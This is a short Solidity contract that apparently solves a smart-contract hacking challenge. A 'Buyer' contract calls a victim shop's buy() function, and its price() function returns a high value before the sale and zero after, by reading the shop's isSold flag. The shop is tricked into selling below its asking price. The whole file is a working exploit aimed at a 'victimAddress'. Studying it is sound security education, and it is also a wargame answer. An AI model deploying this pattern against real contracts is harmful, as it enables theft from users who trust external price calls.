// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract AShop{
    bool public isSold;
    function buy() external virtual;
}

contract Buyer{
    AShop public shopAddress;
    constructor(address victimAddress) {
        shopAddress = AShop(victimAddress);
    } 
    
    function exploit() public{
        shopAddress.buy();
    }

    function price() public view returns (uint256){
        if ( shopAddress.isSold() == true){
            return 100;
        }else {
            return 0;
        }
    }
}